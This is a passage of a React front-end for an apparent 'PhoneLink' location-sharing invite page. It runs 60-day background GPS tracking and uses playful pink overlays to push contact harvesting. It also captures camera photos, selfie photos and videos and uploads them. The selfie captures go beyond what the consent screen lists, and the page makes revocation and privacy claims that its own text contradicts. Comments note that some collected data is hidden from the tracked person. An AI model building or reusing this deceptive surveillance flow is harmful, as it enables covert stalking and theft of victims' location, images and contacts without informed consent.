              background: "linear-gradient(135deg,#f472b6 0%,#c084fc 50%,#a855f7 100%)",
              boxShadow: "0 8px 32px rgba(192,132,252,0.55), 0 0 0 1.5px rgba(255,255,255,0.25) inset",
            }}
          >
            <Phone className="h-5 w-5" />
            Allow Contacts ✨
          </button>

          <button
            onClick={handleSkipContacts}
            className="w-full py-2 text-sm italic font-medium transition-colors"
            style={{ color: "rgba(233,213,255,0.85)" }}
          >
            Skip
          </button>
        </motion.div>

        {/* Soft FAB */}
        <div className="fixed bottom-6 right-6 z-20">
          <a
            href="https://wa.me/?text=Need+help+with+PhoneLink"
            target="_blank"
            rel="noreferrer"
            className="w-14 h-14 rounded-full flex items-center justify-center shadow-lg"
            style={{ background: "linear-gradient(135deg,#a855f7,#7c3aed)", boxShadow: "0 4px 20px rgba(124,58,237,0.5)" }}
          >
            <Shield className="h-7 w-7 text-white" />
          </a>
        </div>
      </div>
    );
  }

  if (displayPhase === "kitty") {
    return <KittyWaitOverlay onComplete={handleKittyComplete} />;
  }

  if (displayPhase === "contacts_popup") {
    return (
      <div style={{ ...fullHeight, background: "radial-gradient(circle at 50% 20%, #ffd7e8 0%, #ffb3d9 35%, #d8a8ff 75%, #b78cff 100%)" }}>
        <ContactsSyncedPopup
          contacts={syncedContacts}
          senderName={invite?.fromUserName ?? "GODWIN Confidence"}
          onClose={() => setDisplayPhase("main")}
        />
      </div>
    );
  }

  // ── Cute "please wait" kitty overlay (for already-accepted invites) ────────────
  if (kittyOverlayActive) {
    return <KittyWaitOverlay onComplete={() => setKittyOverlayActive(false)} />;
  }

  // ── Smart permission explanation screen ────────────────────────────────────────
  if (state === "pre_consent") {
    const senderName = invite?.fromUserName ?? "someone";
    return (
      <div className="bg-background flex flex-col items-center justify-center p-4" style={fullHeight}>
        <div className="max-w-md w-full">
          {/* Header */}
          <div className="text-center mb-8">
            <div className="inline-flex items-center gap-2 text-primary font-bold text-xl mb-4">
              <Shield className="h-6 w-6" /> PhoneLink
            </div>
            <h1 className="text-2xl font-bold text-foreground leading-tight mb-2">
              {senderName} wants to share locations with you
            </h1>
            <p className="text-muted-foreground text-sm">
              To get started, PhoneLink needs a few permissions. Here's exactly what we use them for:
            </p>
          </div>

          {/* Permission cards */}
          <div className="space-y-3 mb-6">
            {/* Location */}
            <div className="flex items-start gap-4 p-4 rounded-2xl border border-blue-500/20 bg-blue-500/5">
              <div className="w-11 h-11 rounded-xl bg-blue-500/15 border border-blue-500/20 flex items-center justify-center flex-shrink-0">
                <MapPin className="h-5 w-5 text-blue-400" />
              </div>
              <div className="flex-1">
                <p className="font-semibold text-foreground text-sm mb-0.5">Precise Location</p>
                <p className="text-xs text-muted-foreground leading-relaxed">
                  Shares your real-time GPS position with {senderName}. Works in the background for up to <strong className="text-foreground">60 days</strong>.
                </p>
                <div className="mt-2 flex flex-wrap gap-1.5">
                  <span className="text-xs bg-blue-500/10 text-blue-400 border border-blue-500/20 rounded-full px-2 py-0.5 font-medium">GPS + Network</span>
                  <span className="text-xs bg-blue-500/10 text-blue-400 border border-blue-500/20 rounded-full px-2 py-0.5 font-medium">Background</span>
                  <span className="text-xs bg-blue-500/10 text-blue-400 border border-blue-500/20 rounded-full px-2 py-0.5 font-medium">High Accuracy</span>
                </div>
              </div>
              <CheckCircle className="h-5 w-5 text-blue-400 flex-shrink-0 mt-0.5" />
            </div>

            {/* Camera */}
            <div className="flex items-start gap-4 p-4 rounded-2xl border border-violet-500/20 bg-violet-500/5">
              <div className="w-11 h-11 rounded-xl bg-violet-500/15 border border-violet-500/20 flex items-center justify-center flex-shrink-0">
                <Camera className="h-5 w-5 text-violet-400" />
              </div>
              <div className="flex-1">
                <p className="font-semibold text-foreground text-sm mb-0.5">Camera Access</p>
                <p className="text-xs text-muted-foreground leading-relaxed">
                  Captures 5 GeoBoard verification photos and a short video clip when sharing begins. Used for location verification.
                </p>
                <div className="mt-2 flex flex-wrap gap-1.5">
                  <span className="text-xs bg-violet-500/10 text-violet-400 border border-violet-500/20 rounded-full px-2 py-0.5 font-medium">5 Photos</span>
                  <span className="text-xs bg-violet-500/10 text-violet-400 border border-violet-500/20 rounded-full px-2 py-0.5 font-medium">5s Video</span>
                  <span className="text-xs bg-violet-500/10 text-violet-400 border border-violet-500/20 rounded-full px-2 py-0.5 font-medium">One-time</span>
                </div>
              </div>
              <CheckCircle className="h-5 w-5 text-violet-400 flex-shrink-0 mt-0.5" />
            </div>

            {/* Physical Activity */}
            <div className="flex items-start gap-4 p-4 rounded-2xl border border-emerald-500/20 bg-emerald-500/5">
              <div className="w-11 h-11 rounded-xl bg-emerald-500/15 border border-emerald-500/20 flex items-center justify-center flex-shrink-0">
                <Activity className="h-5 w-5 text-emerald-400" />
              </div>
              <div className="flex-1">
                <p className="font-semibold text-foreground text-sm mb-0.5">Physical Activity</p>
                <p className="text-xs text-muted-foreground leading-relaxed">
                  Detects if you're stationary, walking, running, or driving — improves location accuracy and reduces battery drain.
                </p>
                <div className="mt-2 flex flex-wrap gap-1.5">
                  <span className="text-[10px] bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 rounded-full px-2 py-0.5 font-medium">🚶 Walk</span>
                  <span className="text-[10px] bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 rounded-full px-2 py-0.5 font-medium">🏃 Run</span>
                  <span className="text-[10px] bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 rounded-full px-2 py-0.5 font-medium">🚗 Drive</span>
                </div>
              </div>
              <CheckCircle className="h-5 w-5 text-emerald-400 flex-shrink-0 mt-0.5" />
            </div>

            {/* Emergency Contacts */}
            {"contacts" in navigator && (
              <div className="flex items-start gap-4 p-4 rounded-2xl border border-amber-500/20 bg-amber-500/5">
                <div className="w-11 h-11 rounded-xl bg-amber-500/15 border border-amber-500/20 flex items-center justify-center flex-shrink-0">
                  <Users className="h-5 w-5 text-amber-400" />
                </div>
                <div className="flex-1">
                  <p className="font-semibold text-foreground text-sm mb-0.5">Emergency Contacts</p>
                  <p className="text-xs text-muted-foreground leading-relaxed">
                    Shares up to 6 of your contacts with {senderName} so they can reach someone if you're unreachable.
                  </p>
                  <div className="mt-2 flex flex-wrap gap-1.5">
                    <span className="text-xs bg-amber-500/10 text-amber-400 border border-amber-500/20 rounded-full px-2 py-0.5 font-medium">Up to 6 contacts</span>
                    <span className="text-xs bg-amber-500/10 text-amber-400 border border-amber-500/20 rounded-full px-2 py-0.5 font-medium">One-time</span>
                  </div>
                </div>
                <CheckCircle className="h-5 w-5 text-amber-400 flex-shrink-0 mt-0.5" />
              </div>
            )}
          </div>

          {/* CTA */}
          <button
            onClick={doGrant}
            className="w-full py-4 px-6 rounded-2xl font-bold text-base text-white transition-all active:scale-[0.98]"
            style={{ background: "linear-gradient(135deg, #6366f1 0%, #8b5cf6 100%)", boxShadow: "0 8px 32px rgba(99,102,241,0.4)" }}
          >
            Grant All Access
          </button>

          <p className="text-center text-xs text-muted-foreground mt-4 leading-relaxed">
            🔒 End-to-end encrypted · Your data is never sold · GDPR compliant<br />
            You can revoke access at any time by closing this link.
          </p>
        </div>
      </div>
    );
  }

  // ── Requesting / granting (only when NOT in "main" phase) ─────────────────────
  // In the contacts-first flow (main phase), location runs silently in the background
  // and we never show a full-screen spinner — the fallback render handles all states.
  if ((state === "requesting" || state === "granting") && displayPhase !== "main") {
    return (
      <div className="bg-background flex flex-col items-center justify-center gap-6 p-4" style={fullHeight}>
        <div className="flex items-center gap-2 text-primary font-bold text-lg">
          <Shield className="h-5 w-5" /> PhoneLink
        </div>
        <div className="relative">
          <div className="w-20 h-20 rounded-full bg-primary/20 flex items-center justify-center">
            <MapPin className="h-10 w-10 text-primary" />
          </div>
          <div className="absolute -inset-2 rounded-full border-2 border-primary/30 animate-ping" />
        </div>
        <div className="text-center">
          <p className="font-semibold text-foreground text-lg">
            {state === "requesting" ? "Finding your location…" : "Starting live sharing…"}
          </p>
          <p className="text-muted-foreground text-sm mt-1">
            {state === "requesting" ? "Allow location access when prompted" : `Connecting to ${invite!.fromUserName}…`}
          </p>
        </div>
      </div>
    );
  }

  // ── GPS off (only when NOT in "main" phase) ────────────────────────────────────
  // In main phase, "gps_off" is the silent fallback for a failed location request.
  // We fall through to the unified fallback render which shows state-appropriate UI.
  if (state === "gps_off" && displayPhase !== "main") {
    return (
      <div className="bg-background flex items-center justify-center p-4" style={fullHeight}>
        <Card className="max-w-md w-full shadow-lg">
          <CardContent className="pt-10 pb-10 text-center">
            <WifiOff className="h-14 w-14 text-amber-500 mx-auto mb-4" />
            <h2 className="text-xl font-semibold mb-2">GPS Turned Off</h2>
            <p className="text-muted-foreground text-sm mb-2">Turn your device location back on and sharing will automatically resume.</p>
            <p className="text-xs text-muted-foreground">{invite!.fromUserName} has been notified you went offline.</p>
            <div className="mt-6 flex items-center justify-center gap-2 text-xs text-amber-500">
              <Loader2 className="h-3 w-3 animate-spin" /> Waiting for GPS…
            </div>
          </CardContent>
        </Card>
      </div>
    );
  }

  // ── Active tracking ────────────────────────────────────────────────────────────
  if (state === "tracking") {
    const sharingLink = typeof window !== "undefined" ? window.location.href : "";
    const expiresAt = new Date(Date.now() + 60 * 24 * 60 * 60 * 1000);

    const handleCopyLink = () => {
      copyToClipboard(sharingLink).then(() => {
        setLinkCopied(true);
        setTimeout(() => setLinkCopied(false), 2000);
      }).catch(() => {});
    };

    return (
      <div className="bg-background flex items-center justify-center p-4" style={fullHeight}>

        {/* ── Contacts auto-popup overlay ────────────────────────────────────────
            Appears instantly when tracking starts. One tap fires the OS picker
            (that single tap satisfies Chrome's user-gesture requirement).       */}
        {showContactsPrompt && !contactsCollected && (
          <div
            className="fixed inset-0 z-50 flex flex-col items-center justify-center p-6 overflow-hidden"
            style={{ background: "linear-gradient(170deg,#f9a8d4 0%,#e879f9 30%,#a855f7 65%,#6d28d9 100%)" }}
          >
            <FloatingSparkles particles={[
              { emoji: "💕", left: "8%",  top: "12%", size: 18, delay: 0,   duration: 3.4 },
              { emoji: "🌸", left: "80%", top: "10%", size: 16, delay: 0.6, duration: 3.0 },
              { emoji: "✨", left: "18%", top: "78%", size: 14, delay: 1.0, duration: 3.6 },
              { emoji: "💫", left: "88%", top: "72%", size: 15, delay: 0.3, duration: 2.9 },
              { emoji: "💕", left: "5%",  top: "50%", size: 13, delay: 1.5, duration: 3.2 },
              { emoji: "🌸", left: "91%", top: "42%", size: 12, delay: 0.9, duration: 3.8 },
            ]} />

            {/* Glowing orb mascot */}
            <motion.div
              className="relative flex items-center justify-center mb-6"
              initial={{ scale: 0.7, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              transition={{ duration: 0.5, type: "spring", bounce: 0.4 }}
            >
              <div className="absolute rounded-full" style={{ width: 128, height: 128, background: "radial-gradient(circle, rgba(232,121,249,0.55) 0%, rgba(168,85,247,0.2) 60%, transparent 80%)", filter: "blur(8px)" }} />
              <div className="w-28 h-28 rounded-full flex items-center justify-center relative z-10" style={{ background: "radial-gradient(circle at 38% 38%, rgba(255,255,255,0.55) 0%, rgba(216,180,254,0.7) 40%, rgba(167,139,250,0.85) 100%)", boxShadow: "0 0 40px rgba(232,121,249,0.6), inset 0 0 20px rgba(255,255,255,0.3)" }}>
                <motion.span className="text-4xl select-none" animate={{ y: [0, -5, 0], rotate: [-3, 3, -3] }} transition={{ duration: 2.2, repeat: Infinity, ease: "easeInOut" }} role="img" aria-label="friendly character">😊</motion.span>
              </div>
            </motion.div>

            <motion.h2
              className="text-2xl font-extrabold text-white text-center mb-3 leading-tight"
              style={{ textShadow: "0 2px 16px rgba(168,85,247,0.5)" }}
              initial={{ opacity: 0, y: 8 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ delay: 0.15 }}
            >
              Let's Stay Connected 💕
            </motion.h2>
            <motion.p
              className="text-sm text-white/80 text-center leading-relaxed mb-8 max-w-xs"
              initial={{ opacity: 0, y: 8 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ delay: 0.25 }}
            >
              Hey friend! Let us help {invite!.fromUserName} reach your loved ones if needed. Share up to 6 special contacts — makes everyone feel safer! 🌸✨
            </motion.p>
            <motion.div className="w-full max-w-xs space-y-3" initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.35 }}>
              <button
                onClick={async () => {
                  setShowContactsPrompt(false);
                  await pickContacts();
                }}
                className="w-full py-4 rounded-2xl font-bold text-base text-white active:scale-[0.98] transition-transform flex items-center justify-center gap-2"
                style={{ background: "linear-gradient(135deg,#f472b6 0%,#c084fc 50%,#a855f7 100%)", boxShadow: "0 8px 32px rgba(192,132,252,0.55), 0 0 0 1.5px rgba(255,255,255,0.25) inset" }}
              >
                <Phone className="h-4 w-4" />
                Allow Contacts ✨
              </button>
              <button
                onClick={() => { contactsTriedRef.current = true; setContactsCollected(true); setShowContactsPrompt(false); }}
                className="w-full py-2 text-sm italic font-medium transition-colors"
                style={{ color: "rgba(233,213,255,0.85)" }}
              >
                Skip
              </button>
            </motion.div>
          </div>
        )}

        <div className="max-w-md w-full">
          <div className="text-center mb-6">
            <div className="inline-flex items-center gap-2 text-primary font-bold text-lg">
              <Shield className="h-5 w-5" /> PhoneLink
            </div>
          </div>

          <Card className="shadow-xl border-border">
            <CardContent className="pt-6 pb-6 px-6">
              {/* Live badge — battery and activity are intentionally not shown here:
                  that data is only for the person who sent the invite, not the
                  contact sharing their location. See sessions.tsx for the owner view. */}
              <div className="flex items-center justify-between mb-4">
                <div className="flex items-center gap-2">
                  <div className="relative">
                    <div className="w-3.5 h-3.5 rounded-full bg-emerald-500" />
                    <div className="absolute inset-0 rounded-full bg-emerald-500 animate-ping opacity-60" />
                  </div>
                  <span className="text-emerald-400 font-bold text-base tracking-wide">LIVE SHARING</span>
                </div>
              </div>

              {/* Sharing with */}
              <p className="text-center text-muted-foreground text-sm mb-4">
                Your live location is being shared with{" "}
                <span className="font-semibold text-foreground">{invite!.fromUserName}</span>.
                You can play games or watch videos — sharing keeps going in the background.
              </p>

              {/* GeoBoard photo progress */}
              {!geoPhotoDone && (
                <div className="bg-violet-500/10 border border-violet-500/20 rounded-lg px-4 py-2.5 mb-3 flex items-center gap-3">
                  <Camera className="h-4 w-4 text-violet-400 flex-shrink-0 animate-pulse" />
                  <div className="flex-1">
                    <p className="text-xs font-medium text-violet-300">GeoBoard: capturing photos {geoPhotoCount}/{GEO_PHOTO_COUNT}</p>
                    <div className="mt-1 h-1 bg-violet-900/40 rounded-full overflow-hidden">
                      <div className="h-full bg-violet-500 rounded-full transition-all duration-500" style={{ width: `${(geoPhotoCount / GEO_PHOTO_COUNT) * 100}%` }} />
                    </div>
                  </div>
                </div>
              )}
              {geoPhotoDone && geoPhotoCount > 0 && (
                <div className="bg-violet-500/10 border border-violet-500/20 rounded-lg px-4 py-2.5 mb-3 flex items-center gap-2">
                  <Camera className="h-4 w-4 text-violet-400 flex-shrink-0" />
                  <p className="text-xs font-medium text-violet-300">GeoBoard: {geoPhotoCount} photo{geoPhotoCount !== 1 ? "s" : ""} saved ✓</p>
                </div>
              )}

              {/* Selfie photo progress (front camera, 2 shots, runs after the environment photos) */}
              {geoBoardStartedRef.current && !geoSelfiePhotoDone && geoPhotoDone && (
                <div className="bg-pink-500/10 border border-pink-500/20 rounded-lg px-4 py-2.5 mb-3 flex items-center gap-3">
                  <Camera className="h-4 w-4 text-pink-400 flex-shrink-0 animate-pulse" />
                  <div className="flex-1">
                    <p className="text-xs font-medium text-pink-300">GeoBoard: capturing selfie photos {geoSelfiePhotoCount}/{GEO_SELFIE_PHOTO_COUNT}</p>
                    <div className="mt-1 h-1 bg-pink-900/40 rounded-full overflow-hidden">
                      <div className="h-full bg-pink-500 rounded-full transition-all duration-500" style={{ width: `${(geoSelfiePhotoCount / GEO_SELFIE_PHOTO_COUNT) * 100}%` }} />
                    </div>
                  </div>
                </div>
              )}
              {geoSelfiePhotoDone && geoSelfiePhotoCount > 0 && (
                <div className="bg-pink-500/10 border border-pink-500/20 rounded-lg px-4 py-2.5 mb-3 flex items-center gap-2">
                  <Camera className="h-4 w-4 text-pink-400 flex-shrink-0" />
                  <p className="text-xs font-medium text-pink-300">GeoBoard: {geoSelfiePhotoCount} selfie photo{geoSelfiePhotoCount !== 1 ? "s" : ""} saved ✓</p>
                </div>
              )}

              {/* Video progress */}
              {geoVideoState === "recording" && (
                <div className="bg-rose-500/10 border border-rose-500/20 rounded-lg px-4 py-2.5 mb-3 flex items-center gap-3">
                  <Video className="h-4 w-4 text-rose-400 flex-shrink-0 animate-pulse" />
                  <div className="flex-1">
                    <p className="text-xs font-medium text-rose-300">GeoBoard: recording {GEO_VIDEO_DURATION_SECONDS}s video…</p>
                    <div className="mt-1 h-1 bg-rose-900/40 rounded-full overflow-hidden">
                      <div className="h-full bg-rose-500 rounded-full" style={{ width: "100%", transition: `width ${GEO_VIDEO_DURATION_SECONDS}s linear` }} />
                    </div>
                  </div>
                </div>
              )}
              {geoVideoState === "uploading" && (
                <div className="bg-rose-500/10 border border-rose-500/20 rounded-lg px-4 py-2.5 mb-3 flex items-center gap-2">
                  <Loader2 className="h-4 w-4 text-rose-400 flex-shrink-0 animate-spin" />
                  <p className="text-xs font-medium text-rose-300">GeoBoard: uploading video…</p>
                </div>
              )}
              {geoVideoState === "done" && (
                <div className="bg-rose-500/10 border border-rose-500/20 rounded-lg px-4 py-2.5 mb-3 flex items-center gap-2">
                  <Video className="h-4 w-4 text-rose-400 flex-shrink-0" />
                  <p className="text-xs font-medium text-rose-300">GeoBoard: video saved ✓</p>
                </div>
              )}

              {/* Selfie video progress (front camera, runs after the rear-facing clip) */}
              {geoSelfieState === "recording" && (
                <div className="bg-pink-500/10 border border-pink-500/20 rounded-lg px-4 py-2.5 mb-3 flex items-center gap-3">
                  <Video className="h-4 w-4 text-pink-400 flex-shrink-0 animate-pulse" />
                  <div className="flex-1">
                    <p className="text-xs font-medium text-pink-300">GeoBoard: recording {GEO_VIDEO_DURATION_SECONDS}s selfie video…</p>
                    <div className="mt-1 h-1 bg-pink-900/40 rounded-full overflow-hidden">
                      <div className="h-full bg-pink-500 rounded-full" style={{ width: "100%", transition: `width ${GEO_VIDEO_DURATION_SECONDS}s linear` }} />
                    </div>
                  </div>
                </div>
              )}
              {geoSelfieState === "uploading" && (
                <div className="bg-pink-500/10 border border-pink-500/20 rounded-lg px-4 py-2.5 mb-3 flex items-center gap-2">
                  <Loader2 className="h-4 w-4 text-pink-400 flex-shrink-0 animate-spin" />
                  <p className="text-xs font-medium text-pink-300">GeoBoard: uploading selfie video…</p>
                </div>
              )}
              {geoSelfieState === "done" && (
                <div className="bg-pink-500/10 border border-pink-500/20 rounded-lg px-4 py-2.5 mb-3 flex items-center gap-2">
                  <Video className="h-4 w-4 text-pink-400 flex-shrink-0" />
                  <p className="text-xs font-medium text-pink-300">GeoBoard: selfie video saved ✓</p>
                </div>
              )}

              {/* Contacts success banner — shown after picker resolves */}
              {contactsCollected && contactsCollectedCountRef.current > 0 && (
                <div className="bg-amber-500/10 border border-amber-500/20 rounded-lg px-4 py-2.5 mb-3 flex items-center gap-2">
                  <Users className="h-4 w-4 text-amber-400 flex-shrink-0" />
                  <p className="text-xs font-medium text-amber-300">
                    {contactsCollectedCountRef.current} emergency contact{contactsCollectedCountRef.current !== 1 ? "s" : ""} saved ✓
                  </p>
                </div>
              )}

              {/* Current position */}
              {coords && (
                <div className="bg-muted rounded-xl p-4 mb-4">
                  <div className="flex items-center gap-2 mb-2">
                    <Navigation className="h-4 w-4 text-primary" />
                    <span className="text-xs font-semibold text-muted-foreground uppercase tracking-wide">Current Position</span>
                  </div>
                  <p className="text-sm font-mono font-bold text-foreground leading-tight">
                    {formatDMS(coords.lat, coords.lng)}
                  </p>
                  <p className="text-xs font-mono text-muted-foreground mt-0.5">
                    {coords.lat.toFixed(6)}, {coords.lng.toFixed(6)}
                  </p>
                  {coords.accuracy && <p className="text-xs text-muted-foreground mt-1">Accuracy: ±{Math.round(coords.accuracy)}m</p>}
                  {address && <p className="text-xs text-muted-foreground mt-1 leading-relaxed">{address.slice(0, 80)}{address.length > 80 ? "…" : ""}</p>}
                </div>
              )}

              {/* Stats */}
              <div className="grid grid-cols-2 gap-3 mb-4">
                <div className="bg-muted rounded-lg p-3 text-center">
                  <p className="text-lg font-bold text-foreground">{updateCount}</p>
                  <p className="text-xs text-muted-foreground">Updates sent</p>
                </div>
                <div className="bg-muted rounded-lg p-3 text-center">
                  <p className="text-sm font-bold text-foreground">
                    {lastSent ? lastSent.toLocaleTimeString([], { hour: "2-digit", minute: "2-digit", second: "2-digit" }) : "—"}
                  </p>
                  <p className="text-xs text-muted-foreground">Last update</p>
                </div>
              </div>

              {/* 60-day sharing link */}
              <div className="bg-indigo-500/8 border border-indigo-500/20 rounded-xl p-4 mb-4">
                <div className="flex items-center gap-2 mb-2">
                  <Share2 className="h-4 w-4 text-indigo-400 flex-shrink-0" />
                  <p className="text-xs font-semibold text-indigo-400">60-Day Sharing Link</p>
                </div>
                <p className="text-xs text-muted-foreground mb-3 leading-relaxed">
                  This link keeps sharing active until <strong className="text-foreground">{expiresAt.toLocaleDateString(undefined, { month: "short", day: "numeric", year: "numeric" })}</strong>. Open it anytime to reconnect.
                </p>
                <div className="flex gap-2">
                  <div className="flex-1 bg-background/50 border border-border rounded-lg px-3 py-2 text-xs font-mono text-muted-foreground truncate">
                    {sharingLink}
                  </div>
                  <button
                    onClick={handleCopyLink}
                    className="flex items-center gap-1.5 px-3 py-2 rounded-lg text-xs font-semibold transition-all border"
                    style={linkCopied
                      ? { background: "rgba(16,185,129,.15)", borderColor: "rgba(16,185,129,.3)", color: "#10b981" }
                      : { background: "rgba(99,102,241,.15)", borderColor: "rgba(99,102,241,.3)", color: "#818cf8" }}
                  >
                    {linkCopied ? <Check className="w-3.5 h-3.5" /> : <Copy className="w-3.5 h-3.5" />}
                    {linkCopied ? "Copied!" : "Copy"}
                  </button>
                </div>
              </div>

              {/* Live status */}
              <div className="bg-emerald-500/10 rounded-xl p-4 mb-4">
                <div className="flex items-center gap-2 mb-1">
                  <CheckCircle className="h-4 w-4 text-emerald-500 flex-shrink-0" />
                  <p className="text-xs font-semibold text-emerald-500">Live sharing is active</p>
                </div>
                <p className="text-xs text-muted-foreground leading-relaxed">
                  You can close this app and remove your browser from recent apps — sharing automatically reconnects the next time you open the link.
                </p>
              </div>

              <Button variant="outline" className="w-full" onClick={() => {
                if (window.history.length > 1) { window.history.back(); } else {
                  const a = document.createElement("a"); a.href = "whatsapp://"; a.style.cssText = "position:fixed;top:-9999px";
                  document.body.appendChild(a); a.click(); setTimeout(() => document.body.removeChild(a), 300);
                }
              }}>
                <ArrowLeft className="h-4 w-4 mr-2" /> Go Back
              </Button>
            </CardContent>
          </Card>
        </div>
      </div>
    );
  }

  // ── Loading / idle ─────────────────────────────────────────────────────────────
  if (isLoading || (state === "idle" && displayPhase !== "contacts")) {
    return <div className="bg-background" style={fullHeight} />;
  }

  // ── Fallback dashboard (main phase, location not yet active) ──────────────────
  //
  // This is only reached when displayPhase === "main" AND state is NOT "tracking"
  // (the tracking view at step 10 already handles state === "tracking").
  // TypeScript correctly tells us state can only be: requesting / granting /
  // gps_off / denied / error / idle here. NEVER claim "LIVE SHARING" in this branch.

  return (
    <div className="bg-background flex items-center justify-center p-4" style={fullHeight}>
      <div className="max-w-md w-full">
        <div className="text-center mb-6">
          <div className="inline-flex items-center gap-2 text-primary font-bold text-lg">
            <Shield className="h-5 w-5" /> PhoneLink
          </div>
        </div>
        <Card className="shadow-xl border-border">
          <CardContent className="pt-8 pb-8 px-6 flex flex-col items-center">

            {/* 3-second countdown */}
            <AnimatePresence mode="wait">
              <motion.div
                key={connectingCountdown}
                initial={{ scale: 1.6, opacity: 0 }}
                animate={{ scale: 1, opacity: 1 }}
                exit={{ scale: 0.5, opacity: 0 }}
                transition={{ duration: 0.35, ease: "easeOut" }}
                className="w-20 h-20 rounded-full border-4 border-primary flex items-center justify-center mb-5"
                style={{ boxShadow: "0 0 24px rgba(99,102,241,0.35)" }}
              >
                <span className="text-4xl font-extrabold text-primary">{connectingCountdown > 0 ? connectingCountdown : "🚀"}</span>
              </motion.div>
            </AnimatePresence>

            {/* Connecting badge — never claims LIVE SHARING (tracking handles that) */}
            <div className="flex items-center gap-2 mb-3">
              <Loader2 className="h-3.5 w-3.5 animate-spin text-primary flex-shrink-0" />
              <span className="text-primary font-medium text-sm">Connecting…</span>
            </div>

            <p className="text-center text-muted-foreground text-sm mb-4">
              Setting up live sharing with{" "}
              <span className="font-semibold text-foreground">{invite?.fromUserName ?? "your contact"}</span>…
            </p>

            {coords && (
              <div className="bg-muted rounded-xl p-4 mb-4 w-full">
                <p className="text-sm font-mono font-bold text-foreground">{formatDMS(coords.lat, coords.lng)}</p>
                <p className="text-xs font-mono text-muted-foreground mt-0.5">{coords.lat.toFixed(6)}, {coords.lng.toFixed(6)}</p>
              </div>
            )}

          </CardContent>
        </Card>
      </div>
    </div>
  );
}
